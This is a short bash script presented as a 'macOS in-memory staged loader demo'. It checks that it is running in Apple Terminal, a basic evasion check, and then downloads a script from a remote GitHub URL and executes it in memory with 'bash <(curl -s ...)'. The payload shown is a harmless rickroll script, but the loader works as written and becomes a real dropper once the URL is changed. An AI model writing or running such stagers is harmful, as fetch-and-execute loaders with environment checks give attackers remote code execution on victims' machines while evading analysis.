#!/bin/bash
# macOS in-memory staged loader demo

# URL of the payload
PAYLOAD_URL="https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh"

# Optional: check if running interactively (simulating Windows host check)
if [[ "$TERM_PROGRAM" != "Apple_Terminal" ]]; then
    echo "Non-interactive session detected. Exiting."
    exit 0
fi

# Stage 1: download and execute in memory
bash <(curl -s "$PAYLOAD_URL")
